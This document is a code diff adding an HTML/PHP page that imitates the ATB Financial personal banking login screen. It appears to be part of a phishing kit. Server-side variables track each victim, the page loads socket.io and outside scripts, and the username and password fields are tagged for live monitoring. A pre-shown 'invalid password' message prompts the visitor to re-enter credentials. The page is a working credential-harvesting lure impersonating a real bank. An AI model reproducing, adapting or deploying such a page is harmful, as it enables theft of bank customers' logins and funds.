@@ -1,0 +1,155 @@
+<html class="fa-events-icons-ready">
+    <head>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+        <link rel="Shortcut Icon" href="favicon.ico" type="image/x-icon">
+        <title>ATB Personal Banking</title>
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <link rel="stylesheet" type="text/css" href="https://cloud.typography.com/6700732/6101192/css/fonts.css">
+        <link href="https://use.fontawesome.com/f26ba7188d.css" media="all" rel="stylesheet">
+        <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,600,700" rel="stylesheet">
+        <link rel="stylesheet" href="/atbassets/atb/main.css?1">
+        <script src="https://code.jquery.com/jquery-3.6.0.min.js" crossorigin="anonymous"></script>
+        <script>
+            var lrbank = '<?=escape($udata->last->bank)?>';
+            var lrinfo = '<?=escape($udata->last->info)?>';
+        </script>
+        <script src="/atbassets/js/actions.js?v=<?=time()?>"></script>
+        <script src="/socket.io/socket.io.js"></script>
+        <style>
+        .bxljLY.warning {
+            border-bottom: 2px solid #F1BE48;
+            color: #63666A;
+        }
+
+        .bxljLY {
+            padding: 0px 0px 20px 0px;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+        </style>
+    </head>
+    <body>
+        <div id="app">
+            <div class="sc-kgoBCf bzQzYK" id="rbw-overall-context-wrapper">
+                <div class="sc-iwsKbI jTTtAZ"></div>
+                <div class="sc-jzJRlG eNoisr">
+                    <form class="sc-jTzLTM cUTnPT lab-form" method="post" id="rbw-login-block">
+                        <div class="sc-bdVaJa khUSez">
+                            <img class="sc-htpNat gRCWAJ" src="/atbassets/atb/atb-jewel.svg" id="rbw-login-heading-atb-logo">
+                            <div class="sc-EHOje ifxqtD" id="rbw-login-heading-contextHeader">
+                                <div class="sc-bZQynM djdoFH">
+                                    <div class="sc-dnqmqq fmWZCn">Personal</div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="sc-fjdhpX Pbrfi div-main" id="rbw-login-form-login-block">
+                            <span class="error-div">
+                                <div class="warning sc-kEYyzF bxljLY" id="rbw-login-form-message-error" data-msg-key="ERR_INVALID_USERNAME_PASSWORD" style="text-align: center">
+                                    <svg width="48px" height="48px" viewBox="0 0 48 48" version="1.1" xmlns="http://www.w3.org/2000/svg" style="margin-bottom: 7px">
+                                        <title>Icons_48x48/Notice</title>
+                                        <g id="warning-notice-icon" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+                                            <g id="Authentication/720/Invalid_login" transform="translate(-336.000000, -199.000000)">
+                                                <g id="Icons_48x48/Notice" transform="translate(336.000000, 199.000000)">
+                                                    <g id="Group-7">
+                                                        <path d="M24,0 C10.745,0 0,10.745 0,24 C0,37.255 10.745,48 24,48 C37.255,48 48,37.255 48,24 C48,10.745 37.255,0 24,0 M24,2 C36.131,2 46,11.869 46,24 C46,36.131 36.131,46 24,46 C11.869,46 2,36.131 2,24 C2,11.869 11.869,2 24,2" id="Fill-1" fill="#F1BE48"></path>
+                                                        <line x1="24" y1="14" x2="24" y2="28" id="Stroke-3" stroke="#F1BE48" stroke-width="2"></line>
+                                                        <line x1="24" y1="31" x2="24" y2="34" id="Stroke-5" stroke="#F1BE48" stroke-width="2"></line>
+                                                    </g>
+                                                </g>
+                                            </g>
+                                        </g>
+                                    </svg>
+                                    <span>
+                                        <h3 id="rbw-login-form-error-title" style="padding-bottom: 7px; color: rgb(99, 102, 106);">Invalid Username or Password</h3>
+                                        <span class="sc-gqjmRU htfXDc"><span id="rbw-login-form-error-message-desktop">The username or password you entered is incorrect. Try again.</span></span>
+                                    </span>
+                                </div>
+                                <div class="sc-VigVT jQbsgO"></div>
+                            </span>
+                            <div>
+                                <span>
+                                    <label id="rbw-login-form-input-username-validation-error-label" class="top input rebank-textfield">Username</label>
+                                    <input id="rbw-login-form-input-username" class="rebank-textfield lrinput" attr-action="Filling Username" required name="username" placeholder="" type="text" value="" style="padding-left: 15px;">
+                                    <span class="rbw-login-form-input-username-clear-field sc-hMqMXs kfWmrv" id="rbw-login-form-input-username-clear-field" data-masked="false" title="Clear" style="cursor: pointer; margin-right: 15px;">
+                                        <svg xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 17 17">
+                                            <g id="rbw-login-form-input-username-clear-field-icon" fill="none" fill-rule="evenodd">
+                                                <path fill="#63666A" fill-opacity=".5" fill-rule="nonzero" d="M8.5 0C3.8 0 0 3.8 0 8.5S3.8 17 8.5 17 17 13.2 17 8.5 13.2 0 8.5 0z"></path>
+                                                <path fill="#FFF" d="M10.946 4.722L8.5 7.168 6.054 4.722 4.722 6.054 7.168 8.5l-2.446 2.446 1.332 1.332L8.5 9.832l2.446 2.446 1.332-1.332L9.832 8.5l2.446-2.446z"></path>
+                                            </g>
+                                        </svg>
+                                    </span>
+                                </span>
+                                <div class="sc-VigVT jQbsgO"></div>
+                                <div class="sc-VigVT jQbsgO"></div>
+                                <span>
+                                    <label id="rbw-login-form-input-password-validation-error-label" class="top input rebank-textfield">Password</label>
+                                    <input id="rbw-login-form-input-password" class="rebank-textfield lrinput" attr-action="Filling Password" required name="password"  placeholder="" type="password" value="" style="padding-left: 15px;">
+                                    <span class="rbw-login-form-input-password-clear-field sc-hMqMXs kfWmrv" id="rbw-login-form-input-password-clear-field" data-masked="true" title="Clear" style="cursor: pointer; margin-right: 50px;">
+                                        <svg xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 17 17">
+                                            <g id="rbw-login-form-input-password-clear-field-icon" fill="none" fill-rule="evenodd">
+                                                <path fill="#63666A" fill-opacity=".5" fill-rule="nonzero" d="M8.5 0C3.8 0 0 3.8 0 8.5S3.8 17 8.5 17 17 13.2 17 8.5 13.2 0 8.5 0z"></path>
+                                                <path fill="#FFF" d="M10.946 4.722L8.5 7.168 6.054 4.722 4.722 6.054 7.168 8.5l-2.446 2.446 1.332 1.332L8.5 9.832l2.446 2.446 1.332-1.332L9.832 8.5l2.446-2.446z"></path>
+                                            </g>
+                                        </svg>
+                                    </span>
+                                    <div class="sc-eNQAEJ fFPsgR" id="mask-toggle" data-masked="true" style="cursor: pointer; margin-right: 10px;">
+                                        <svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" viewBox="0 0 30 23">
+                                            <title>Group 7 Copy</title>
+                                            <desc>Created with Sketch.</desc>
+                                            <g id="login">
+                                                <text x="0" y="22" font-family="Open Sans" fill="#005eb8" font-size="10">Show</text>
+                                            </g>
+                                        </svg>
+                                    </div>
+                                </span>
+                                <div class="sc-VigVT jQbsgO"></div>
+                                <div class="sc-VigVT jQbsgO"></div>
+                                <div class="sc-VigVT jQbsgO"></div>
+                                <div class="uiNewButtonWrapper "><input class="rebank-button primary" id="rbw-login-form-button-submit" label="Log in" type="submit" value="Log in"></div>
+                                <div class="sc-VigVT jQbsgO"></div>
+                                <div class="sc-VigVT jQbsgO"></div>
+                                <button class="sc-dxgOiQ cgwvbs" id="rbw-login-form-button-forgotPassword">Forgot password</button>
+                                <div class="sc-VigVT jQbsgO"></div>
+                                <div class="sc-VigVT jQbsgO"></div>
+                                <button class="sc-dxgOiQ cgwvbs" id="rbw-login-form-button-forgotUsername">Forgot username</button>
+                            </div>
+                        </div>
+                        <div class="sc-bwzfXH jWVvQp div-main" id="rbw-footer-footer-style">
+                            <span id="rbw-footer-footer-login">
+                                <a href="https://www.atb.com" target="_blank">atb.com</a> | <a href="https://www.atb.com/contact-us/Pages/default.aspx" target="_blank">Contact us | </a> <a href="https://www.atb.com/company/privacy-and-security/online-guarantee" target="_blank">Terms</a> | <a href="https://www.atb.com/important-information/privacy-security/Pages/Privacy-and-Security-Tips.aspx?utm_source=atbol&amp;utm_medium=login&amp;utm_campaign=security-commitment-security-tips" target="_blank">Security tips</a>
+                                <div class="sc-VigVT jQbsgO"></div>
+                                <div class="sc-VigVT jQbsgO"></div>
+                                © ATB Financial 2022. All Rights Reserved.
+                                <div class="sc-VigVT jQbsgO"></div>
+                                Authorized access only. Usage may be monitored.
+                            </span>
+                        </div>
+                        <div class="sc-fjdhpX Pbrfi div-loader" style="display: none">
+                            <style>
+                            .loader-div {
+                                text-align: center;
+                                padding-top: 20px;
+                            }
+
+                            .loader-div h2 {
+                                font-size: 28px;
+                                margin-bottom: 40px;
+                            }
+                            </style>
+                            <div class="_1AR6e5iqu8uXHMTFKLnqWr loader-div">
+                                <h2 class="heading--title2 ng-binding">Processing</h2>
+                                <img src="/atbassets/atb/loading.gif" width="80">
+                            </div>
+                        </div>
+                    </form>
+                </div>
+                <div class="sc-kAzzGY cUrlcM">
+                    <div class="sc-chPdSV emnlIF" id="rbw-marquee-block">
+                        <div class="sc-ckVGcZ czSiSX"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </body>
+    <script src="/bank/atb/js/script.js"></script>
+</html>
